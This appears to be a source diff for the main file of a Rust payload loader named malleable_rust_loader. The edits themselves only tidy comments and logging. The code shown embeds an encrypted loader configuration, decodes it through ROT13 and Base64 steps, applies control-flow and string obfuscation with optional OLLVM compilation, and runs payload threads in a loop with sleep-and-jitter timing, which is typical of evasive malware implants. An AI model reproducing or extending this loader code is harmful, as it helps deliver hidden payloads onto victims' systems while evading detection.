@@ -14,7 +14,6 @@ use malleable_rust_loader::payload_util::print_running_thread;
 use log::debug;
 use log::error;
 use log::info;
-//use log::warn;
 extern crate env_logger;
 use cryptify;
 
@@ -26,7 +25,7 @@ const INITIAL_LOADER : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable
 #[cfg(not(feature="ollvm"))]
 const INITIAL_LOADER_DATAOPE: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.aead.dataop.rot13b64"));
 
-// ------ OLLVM compilation from a docker
+// ------ OLLVM compilation from docker
 #[rustfmt::skip]
 #[cfg(feature="ollvm")]
 const INITIAL_LOADER : &[u8] = include_bytes!("/projects/config/initial.json.aead");
@@ -41,7 +40,6 @@ fn main() {
     cryptify::flow_stmt!();
     let loader_conf_encrypted = INITIAL_LOADER.to_vec();
     let data_op_encrypted = INITIAL_LOADER_DATAOPE.to_vec();
-    debug!("{}", lc!("[+] OPEN dataoperation"));
     let ope_for_data_op: Vec<DataOperation> = vec![DataOperation::ROT13, DataOperation::BASE64];
     let decrypted_dataop = un_apply_all_dataoperations(ope_for_data_op, data_op_encrypted).unwrap();
     let dataoperation: Vec<DataOperation> =
@@ -86,18 +84,7 @@ fn main() {
         }
 
         print_running_thread(&mut running_thread);
-        //print running_thread
-        /*
-                if running_thread.len() != 0 {
-                    info!("[+] RUNNING thread {}", running_thread.len());
-                    for i in &running_thread {
-                        info!("-thread: {:?}", i.1);
-                    }
-                } else {
-                    info!("[+] no RUNNING thread");
-                };
-        */
-        //TODO: param to wait for all running thread
+        //TODO wait all thread to finish -> new option
         config.sleep_and_jitt();
         info!(
             "{}{}{}{}",
@@ -107,7 +94,6 @@ fn main() {
             "\n"
         );
 
-        //TODO, add this sleep+jitt time into a config parameter
         loop_nb = loop_nb + 1;
     }
 }
